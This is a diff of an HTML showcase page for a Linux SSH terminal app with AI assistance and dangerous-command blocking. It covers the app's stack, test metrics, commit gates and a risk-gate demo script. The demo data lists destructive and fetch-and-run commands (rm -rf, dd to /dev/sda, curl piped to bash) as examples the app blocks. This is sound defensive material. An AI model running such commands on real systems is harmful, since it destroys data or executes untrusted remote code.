+          <tr><td class="k">界面</td><td>React 19 + TypeScript + Zustand 5 + Radix UI + Tailwind + lucide-react</td></tr>
+          <tr><td class="k">终端</td><td>xterm.js 5 + node-pty（本机）+ ssh2（远端），两侧命令块口径一致</td></tr>
+          <tr><td class="k">编辑器</td><td>Monaco 0.56，资源本地打包，无 CDN 依赖</td></tr>
+          <tr><td class="k">AI</td><td>Vercel AI SDK 7 + 官方 MCP SDK 1.32，Anthropic / Google / OpenAI 兼容端，支持本机 Ollama</td></tr>
+          <tr><td class="k">命令解析</td><td>web-tree-sitter + tree-sitter-bash</td></tr>
+          <tr><td class="k">存储</td><td>better-sqlite3 + sqlite-vec 向量索引，@xenova/transformers 本地嵌入</td></tr>
+          <tr><td class="k">可观测</td><td>Langfuse 追踪（未配置密钥时自动关闭，不影响主流程）</td></tr>
+          <tr><td class="k">测试</td><td>Vitest + Playwright（直驱真实应用窗口，不是 DOM 模拟）</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section id="quality">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>每个数字都带复现命令</h2>
+        <p class="sec-lede" data-rv>下表全部在 2026-10-18 上午由本机重跑取得（单元 09:07，端到端 09:18，UTC+8）。界面和文档里都不出现没有测法的数字。</p>
+      </div>
+      <div class="idx" data-rv>7 条读数<br>各带复现命令</div>
+    </div>
+
+    <div data-rv>
+      <table class="tbl">
+        <thead><tr><th>读数</th><th>值</th><th>怎么量的</th></tr></thead>
+        <tbody>
+          <tr><td class="k">单元与组件用例</td><td class="v">3249 通过</td><td class="c">npm test　<span class="note">另有 19 条按环境跳过，共 3268；270 个测试文件（268 通过 / 2 跳过）</span></td></tr>
+          <tr><td class="k">端到端用例</td><td class="v">57 通过</td><td class="c">npx playwright test　<span class="note">Playwright 直驱真实应用窗口，15 条按是否需要真服务器 / 真模型跳过</span></td></tr>
+          <tr><td class="k">IPC 通道</td><td class="v">272</td><td class="c">npm run audit:ipc　<span class="note">232 请求-响应 + 40 事件推送</span></td></tr>
+          <tr><td class="k">已登记契约的通道</td><td class="v">35</td><td class="c">src/shared/ipc-contract.ts　<span class="note">30 请求-响应 + 5 事件推送</span></td></tr>
+          <tr><td class="k">TypeScript / TSX 源文件</td><td class="v">508</td><td class="c">git ls-files src　<span class="note">按 .ts / .tsx 计数</span></td></tr>
+          <tr><td class="k">命令规则词表项</td><td class="v">216</td><td class="c">src/main/core/command-rules.json　<span class="note">八张表逐项相加</span></td></tr>
+          <tr><td class="k">结构性拦截器</td><td class="v">8</td><td class="c">denyBaseline.blockDetectors</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div style="margin-top:clamp(38px,5vw,64px)">
+      <h3 class="h2" style="font-size:1.2rem" data-rv>每次提交前会跑红的门禁</h3>
+      <ul class="gates" data-rv>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>ESLint 与 TypeScript 类型检查</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>测试代码零类型错误（存量只降不升）</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>死代码闸</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>设计契约闸：令牌单一来源</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>真机界面可读性审计（含浅色模式对比度）</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>IPC 契约一致性（生成物与契约对账）</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>本地密钥扫描</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>Git 历史凭据回归扫描</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>内网拓扑按值核对（代码与文档两条腿）</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>只写不读状态键检测</li>
+        <li><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3 3 7-7" stroke="#6aa9e8" stroke-width="2" fill="none" stroke-linecap="round"/></svg>按钮真伪普查：逐页真点每个可见按钮</li>
       </ul>
     </div>
-  </section>
+  </div>
+</section>
 
-</div>
-
-<footer>
-  <div class="wrap">
-    <div class="links">
-      <a href="https://github.com/harryopo">GitHub @harryopo</a>
-      <a href="https://harryopo.github.io/tdsf-terminal-agent/">同系列：TDSF Terminal Agent（桌面版）</a>
-      <a href="https://harryopo.github.io/">返回项目门户</a>
+<section class="band" id="status">
+  <div class="shell">
+    <div class="head-row">
+      <div>
+        <h2 class="h2" data-rv>当前状态与边界</h2>
+        <p class="sec-lede" data-rv>这几条写在这里，是为了让“能做”和“现在就能用”不混为一谈。</p>
+      </div>
+      <div class="idx" data-rv>4 条<br>没做到的不写成做到</div>
     </div>
-    <div>TDSF-Linux Desktop · 截图与文字均来自本机真实运行界面 · 页面最后更新 2026-10-17</div>
+    <div class="honest" data-rv>
+      <ul>
+        <li><span class="mk">未发布</span><span>项目仍在持续开发，源码仓库当前为私有状态，暂未公开发布安装包。需要试用或源码，请通过下方联系方式沟通。</span></li>
+        <li><span class="mk">需连接</span><span>监控、日志与远端文件能力需要先连上一台 Linux 服务器；未连接时界面显示空状态，不放示例数据。</span></li>
+        <li><span class="mk">看模型</span><span>AI 能力取决于所配置的模型。本地小模型下工具调用的稳定性会明显下降，此时建议只用于解释与诊断。</span></li>
+        <li><span class="mk">会降级</span><span>可信度融合在证据权重读取失败时降级为无权重融合，界面如实显示降级，不会静默给一个看起来更准的数字。</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer id="contact">
+  <div class="shell foot-grid">
+    <div>
+      <div class="foot-links">
+        <a href="https://github.com/harryopo">GitHub @harryopo</a>
+        <a href="https://harryopo.github.io/tdsf-terminal-agent/">同系列：TDSF Terminal Agent（桌面版）</a>
+        <a href="https://harryopo.github.io/">返回项目门户</a>
+      </div>
+      <p class="foot-meta">
+        截图与界面文字均来自本机真实运行窗口 · 页面读数时间 2026-10-18 09:07 UTC+8<br>
+        演示里的命令与判定文字取自仓内规则数据；主机地址用 RFC 5737 文档保留段
+      </p>
+    </div>
+    <div class="foot-meta" style="text-align:right">
+      TDSF-Linux Desktop<br>SSH 终端 + AI 辅助 + 高危命令拦截 + 可信决策
+    </div>
   </div>
 </footer>
 
+<dialog class="lightbox" id="lightbox" aria-label="截图放大">
+  <div class="lb-in">
+    <div class="lb-top">
+      <span id="lb-name">screenshot</span>
+      <button type="button" id="lb-close">关闭 ESC</button>
+    </div>
+    <div class="lb-img"><img id="lb-img" src="" alt=""></div>
+  </div>
+</dialog>
+
+<script>
+(function () {
+  'use strict';
+  var canObserve = 'IntersectionObserver' in window;
+  var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  /* ---------- 滚动进度 + 当前分区 ---------- */
+  var bar = document.getElementById('bar');
+  var links = Array.prototype.slice.call(document.querySelectorAll('.nav-links a'));
+  var ticking = false;
+  function onScroll() {
+    if (ticking) return;
+    ticking = true;
+    requestAnimationFrame(function () {
+      ticking = false;
+      var h = document.documentElement.scrollHeight - window.innerHeight;
+      var p = h > 0 ? Math.min(1, window.scrollY / h) : 1;
+      if (bar) bar.style.transform = 'scaleX(' + p.toFixed(4) + ')';
+      var seen = null;
+      links.forEach(function (a) {
+        var t = document.getElementById(a.getAttribute('href').slice(1));
+        if (t && t.getBoundingClientRect().top <= 120) seen = a;
+      });
+      links.forEach(function (a) {
+        if (a === seen) a.setAttribute('aria-current', 'true');
+        else a.removeAttribute('aria-current');
+      });
+    });
+  }
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+
+  /* ---------- 四步链路：滚动到哪填到哪 ---------- */
+  var fill = document.getElementById('rail-fill');
+  var steps = Array.prototype.slice.call(document.querySelectorAll('[data-step]'));
+  if (fill && steps.length && !reduce) {
+    var rail = fill.parentElement;
+    var railTick = false;
+    var paintRail = function () {
+      railTick = false;
+      var r = rail.getBoundingClientRect();
+      var vh = window.innerHeight;
+      var t = Math.max(0, Math.min(1, (vh * 0.72 - r.top) / Math.max(1, r.height)));
+      fill.style.transform = 'scaleX(' + t.toFixed(3) + ')';
+      steps.forEach(function (s, i) {
+        var on = t >= (i + 0.5) / steps.length;
+        s.classList.toggle('on', on);
+      });
+    };
+    window.addEventListener('scroll', function () {
+      if (!railTick) { railTick = true; requestAnimationFrame(paintRail); }
+    }, { passive: true });
+    window.addEventListener('resize', paintRail);
+    paintRail();
+  } else {
+    steps.forEach(function (s) { s.classList.add('on'); });
+  }
+
+  /* ---------- 风险闸演示数据：等级/原因/来源逐字取自仓内规则 ---------- */
+  var CASES = [
+    { c: 'rm -rf /var/log', lv: 'block', why: '递归强制删除根级/系统目录', src: '结构检测器 rmRfProtectedTarget（rm 递归 + 强制 + 目标命中受保护清单）', fx: '命令不会送进 shell，拦截记录写入本地留痕，界面给出替代做法。' },
+    { c: 'chmod 777 /etc', lv: 'block', why: '将系统关键路径 /etc 的权限放开为全局可写', src: '结构检测器 rootPermissionOpen（先归一 0777 / 777 / o+w 再判）', fx: '同上。写权限对其他人放开即命中，不看目录层级。' },
+    { c: 'dd if=/dev/zero of=/dev/sda', lv: 'block', why: 'dd 写入块设备', src: '结构检测器 deviceDestruction（重定向目的地归一后比对块设备）', fx: '设备内容不可恢复，这类写法没有“撤销”这一说，所以直接禁。' },
+    { c: 'curl -fsSL https://example.invalid/i.sh | bash', lv: 'block', why: '管道把上游内容交给解释器执行', src: '结构检测器 shellPayloadExecution（先识别管道上游，再看下游是不是解释器）', fx: '想跑就先把脚本落盘、看过、再执行那一个文件。' },
+    { c: 'kill -9 4242', lv: 'high', why: '终止进程', src: 'argv 规则 kill（数据文件维护，不可逆标记为真）', fx: '允许执行，但要过审批卡点，并在留痕里标出“不可逆”。' },
+    { c: 'systemctl restart nginx', lv: 'medium', why: '停止/重启/禁用系统服务', src: 'argv 规则 service-stop + 只读子命令护栏（status 只读，restart 不算）', fx: '执行前弹决策卡；同名不同事的写法靠护栏区分，不靠命令名。' },
+    { c: 'apt-get install nginx', lv: 'medium', why: '安装/卸载软件包', src: 'argv 规则 package-change', fx: '执行前弹决策卡，装完的包名与版本进操作历史。' },
+    { c: 'journalctl -u nginx --since "10 min ago"', lv: 'low', why: '只读查询命令', src: '只读白名单 + 护栏（必须带范围旗标，否则会一直刷屏不返回）', fx: '直接执行，并且这一条命令与它的输出会切成一块存进历史。' }
+  ];
+  var LV = { block: ['已拦截 · BLOCK', 'lv-block'], high: ['需审批 · HIGH', 'lv-high'], medium: ['需确认 · MEDIUM', 'lv-medium'], low: ['放行 · LOW', 'lv-low'] };
+  var roCmd = document.getElementById('ro-cmd'), roLv = document.getElementById('ro-lv');
+  var roWhy = document.getElementById('ro-why'), roSrc = document.getElementById('ro-src'), roFx = document.getElementById('ro-fx');
+  var chips = Array.prototype.slice.call(document.querySelectorAll('.chip[data-cmd]'));
+  function showCase(i) {
+    var d = CASES[i];
+    if (!d || !roCmd) return;
+    chips.forEach(function (c, n) { c.setAttribute('aria-pressed', n === i ? 'true' : 'false'); });
+    roCmd.textContent = d.c;
+    roLv.textContent = LV[d.lv][0];
+    roLv.className = 'lv ' + LV[d.lv][1];
+    roWhy.textContent = d.why;
+    roSrc.textContent = d.src;
+    roFx.textContent = d.fx;
+    if (!reduce) {
+      var box = document.getElementById('readout');
+      box.style.transition = 'none';
+      box.style.opacity = '0.45';
+      requestAnimationFrame(function () {
+        box.style.transition = 'opacity 180ms var(--ease)';
+        box.style.opacity = '1';
+      });
+    }
+  }
+  chips.forEach(function (c) { c.addEventListener('click', function () { showCase(parseInt(c.getAttribute('data-cmd'), 10)); }); });
+
+  /* ---------- 终端演示：只重写 #term-live 那一格 ----------
+     上面两条是会话里已经跑完的命令，永远留在屏上；打字只循环下面这一条。
+     这样任何时刻截到屏，pane 都是满的，也不会出现"演示跑到一半被划走"的空洞。 */
+  var liveBox = document.getElementById('term-live');
+  var gateEl = document.getElementById('gate-state');
+  var traceEl = document.getElementById('trace');
+  var LIVE_STATIC = liveBox ? liveBox.innerHTML : '';
+  var LIVE_PICKS = [3, 1, 2, 7];
+  var pickIdx = 0;
+  var runToken = 0;
+  function sleep(ms, tok) {
+    return new Promise(function (res) { setTimeout(function () { res(tok === runToken); }, ms); });
+  }
+  function appendRow(cls, html) {
+    var d = document.createElement('div');
+    d.className = cls;
+    d.innerHTML = html;
+    liveBox.appendChild(d);
+    return d;
+  }
+  function emitPulse(kind) { if (typeof window.__pulse === 'function') window.__pulse(kind); }
+  async function play() {
+    if (!liveBox || reduce) return;
+    var tok = ++runToken;
+    var d = CASES[LIVE_PICKS[pickIdx++ % LIVE_PICKS.length]];
+    liveBox.innerHTML = '';
+    if (gateEl) gateEl.textContent = '判定中…';
+    var r = appendRow('tl', '<span class="ps">$</span><span class="cmd"><span class="typed"></span><span class="cursor" aria-hidden="true"></span></span>');
+    var typed = r.querySelector('.typed');
+    for (var j = 0; j < d.c.length; j++) {
+      typed.textContent += d.c.charAt(j);
+      if (!(await sleep(26, tok))) return;
+    }
+    var cur = r.querySelector('.cursor');
+    if (cur) cur.remove();
+    if (!(await sleep(340, tok))) return;
+    var v = appendRow('verdict', '<span class="lv ' + LV[d.lv][1] + '">' + LV[d.lv][0] + '</span><span class="why"></span><span class="src"></span>');
+    v.querySelector('.why').textContent = d.why;
+    v.querySelector('.src').textContent = d.src.split('（')[0];
+    if (gateEl) gateEl.textContent = d.lv === 'block' ? '已拦下' : '已放行';
+    if (traceEl) traceEl.textContent = d.lv === 'block' ? '02' : '01';
+    emitPulse(d.lv === 'block' ? 'block' : 'pass');
+    await sleep(5200, tok);
+    if (runToken === tok) play();
+  }
+  function resetLive() {
+    runToken++;
+    if (liveBox) liveBox.innerHTML = LIVE_STATIC;
+    if (gateEl) gateEl.textContent = '已生效';
+    if (traceEl) traceEl.textContent = '02';
+  }
+  var replay = document.getElementById('replay');
+  if (replay) replay.addEventListener('click', function () {
+    if (reduce) { resetLive(); return; }
+    play();
+  });
+  if (!reduce && canObserve) {
+    var pio = new IntersectionObserver(function (e) {
+      if (e[0].isIntersecting) play(); else resetLive();
+    }, { threshold: 0.2 });
+    pio.observe(document.getElementById('term'));
+  }
+
+  /* ---------- 截图放大 ---------- */
+  var lb = document.getElementById('lightbox');
+  var lbImg = document.getElementById('lb-img');
+  var lbName = document.getElementById('lb-name');
+  Array.prototype.forEach.call(document.querySelectorAll('.plate-btn'), function (b) {
+    b.addEventListener('click', function () {
+      var src = b.getAttribute('data-plate');
+      if (!lb || !lbImg) return;
+      lbImg.src = src;
+      lbImg.alt = (b.querySelector('img') || {}).alt || '界面截图';
+      lbName.textContent = src.replace(/^assets\//, '');
+      if (typeof lb.showModal === 'function') lb.showModal();
+    });
+  });
+  var lbClose = document.getElementById('lb-close');
+  if (lbClose && lb) lbClose.addEventListener('click', function () { lb.close(); });
+
+  /* ---------- 会话拓扑带 ----------
+     数据包不是装饰：蓝点=命令下发/输出回推，橙点=这条被风险闸拦下。
+     前景的终端演示每判一条，这里就发一颗包——两个画布说的是同一件事。 */
+  var cv = document.getElementById('topo-canvas');
+  if (!cv || !cv.getContext) return;
+  var ctx = cv.getContext('2d');
+  var dpr = Math.min(2, window.devicePixelRatio || 1);
+  var W = 0, H = 0, nodes = [], packets = [], hub = null, rafId = 0, live = false, lastFire = 0;
+  var BLUE = [106, 169, 232], WARN = [255, 181, 77], LINE = [48, 68, 90];
+  function seed() {
+    var rect = cv.parentElement.getBoundingClientRect();
+    W = Math.max(320, rect.width);
+    H = Math.max(200, rect.height);
+    cv.width = Math.round(W * dpr);
+    cv.height = Math.round(H * dpr);
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    hub = { x: Math.max(52, W * 0.09), y: H * 0.5, r: 4.2, hot: 0 };
+    var cols = W < 700 ? 3 : 5;
+    var rows = W < 700 ? 3 : 4;
+    nodes = [];
+    for (var r = 0; r < rows; r++) {
+      for (var c = 0; c < cols; c++) {
+        nodes.push({
+          x: W * (0.28 + ((c + 0.5) / cols) * 0.68) + (r % 2 ? 16 : -16),
+          y: Math.min(H - 14, Math.max(14, H * ((r + 0.5) / rows) + (c % 2 ? 10 : -10))),
+          vx: (Math.random() - 0.5) * 0.16,
+          vy: (Math.random() - 0.5) * 0.16,
+          r: 2.4 + (c % 3) * 0.9,
+          hot: 0
+        });
+      }
+    }
+    packets = [];
+  }
+  function fire(kind) {
+    if (!nodes.length) return;
+    var to = nodes[Math.floor(Math.random() * nodes.length)];
+    packets.push({ a: hub, b: to, t: 0, sp: 0.012 + Math.random() * 0.008, kind: kind });
+    if (Math.random() < 0.45) packets.push({ a: to, b: hub, t: 0, sp: 0.016 + Math.random() * 0.008, kind: 'back' });
+  }
+  window.__pulse = function (kind) {
+    if (!live) return;
+    fire(kind);
+    hub.hot = 1;
+    nodes.forEach(function (n) { if (Math.random() < 0.45) n.hot = kind === 'block' ? 1 : 0.55; });
+  };
+  function dot(p, col, a, r, glow) {
+    if (glow) { ctx.shadowColor = 'rgba(' + col + ',' + a + ')'; ctx.shadowBlur = 9; }
+    ctx.fillStyle = 'rgba(' + col + ',' + a + ')';
+    ctx.beginPath(); ctx.arc(p.x, p.y, r, 0, 6.2832); ctx.fill();
+    ctx.shadowBlur = 0;
+  }
+  function frame(now) {
+    ctx.clearRect(0, 0, W, H);
+    var i, k;
+    for (i = 0; i < nodes.length; i++) {
+      var a = nodes[i];
+      var d = Math.hypot(a.x - hub.x, a.y - hub.y);
+      ctx.lineWidth = 1;
+      ctx.strokeStyle = 'rgba(' + LINE[0] + ',' + LINE[1] + ',' + LINE[2] + ',' + Math.max(0.18, 0.62 - d / 1700).toFixed(3) + ')';
+      ctx.beginPath(); ctx.moveTo(hub.x, hub.y); ctx.lineTo(a.x, a.y); ctx.stroke();
+      for (k = i + 1; k < nodes.length; k++) {
+        var c = nodes[k];
+        var dd = Math.hypot(c.x - a.x, c.y - a.y);
+        if (dd < 170) {
+          ctx.strokeStyle = 'rgba(' + LINE[0] + ',' + LINE[1] + ',' + LINE[2] + ',' + (0.5 * (1 - dd / 170)).toFixed(3) + ')';
+          ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(c.x, c.y); ctx.stroke();
+        }
+      }
+    }
+    for (i = 0; i < nodes.length; i++) {
+      var p = nodes[i];
+      if (live) {
+        p.x += p.vx; p.y += p.vy;
+        if (p.x < W * 0.24 || p.x > W - 8) p.vx *= -1;
+        if (p.y < 12 || p.y > H - 12) p.vy *= -1;
+      }
+      p.hot *= 0.95;
+      var hot = p.hot > 0.45;
+      dot(p, hot ? WARN.join(',') : BLUE.join(','), (0.46 + p.hot * 0.5).toFixed(2), p.r, hot);
+    }
+    hub.hot *= 0.92;
+    dot(hub, BLUE.join(','), '0.95', hub.r, true);
+    ctx.lineWidth = 1;
+    ctx.strokeStyle = 'rgba(' + BLUE[0] + ',' + BLUE[1] + ',' + BLUE[2] + ',' + (0.16 + hub.hot * 0.4).toFixed(3) + ')';
+    ctx.beginPath(); ctx.arc(hub.x, hub.y, hub.r + 9 + hub.hot * 13, 0, 6.2832); ctx.stroke();
+    for (var m = packets.length - 1; m >= 0; m--) {
+      var pk = packets[m];
+      pk.t += pk.sp;
+      if (pk.t >= 1) { packets.splice(m, 1); continue; }
+      var e = 1 - Math.pow(1 - pk.t, 3);
+      var col = pk.kind === 'back' ? BLUE : (pk.kind === 'block' ? WARN : BLUE);
+      var x = pk.a.x + (pk.b.x - pk.a.x) * e, y = pk.a.y + (pk.b.y - pk.a.y) * e;
+      var tail = Math.max(0, e - 0.2);
+      var tx = pk.a.x + (pk.b.x - pk.a.x) * tail, ty = pk.a.y + (pk.b.y - pk.a.y) * tail;
+      ctx.lineWidth = 1.6;
+      ctx.strokeStyle = 'rgba(' + col.join(',') + ',0.34)';
+      ctx.beginPath(); ctx.moveTo(tx, ty); ctx.lineTo(x, y); ctx.stroke();
+      dot({ x: x, y: y }, col.join(','), '0.95', 2.4, true);
+    }
+    if (live && now - lastFire > 640) { lastFire = now; fire(Math.random() < 0.16 ? 'block' : 'pass'); }
+    rafId = requestAnimationFrame(frame);
+  }
+  function start() { if (rafId) return; live = true; rafId = requestAnimationFrame(frame); }
+  function stop() { live = false; if (rafId) { cancelAnimationFrame(rafId); rafId = 0; } }
+  seed();
+  window.addEventListener('resize', function () { seed(); });
+  if (reduce) {
+    rafId = requestAnimationFrame(function (t) { frame(t); stop(); });
+    (function staticPackets() {
+      ctx.lineWidth = 1.6;
+      [0, 3, 6, 11].forEach(function (i) {
+        if (!nodes[i]) return;
+        var t = 0.3 + (i % 4) * 0.17;
+        var p = nodes[i];
+        dot({ x: hub.x + (p.x - hub.x) * t, y: hub.y + (p.y - hub.y) * t }, BLUE.join(','), '0.8', 2.4, false);
+      });
+    })();
+  } else if (canObserve) {
+    new IntersectionObserver(function (e) {
+      if (e[0].isIntersecting && !document.hidden) start(); else stop();
+    }, { threshold: 0.02 }).observe(cv.parentElement);
+    document.addEventListener('visibilitychange', function () { if (document.hidden) stop(); else start(); });
+  } else {
+    start();
+  }
+})();
+</script>
 </body>
 </html>
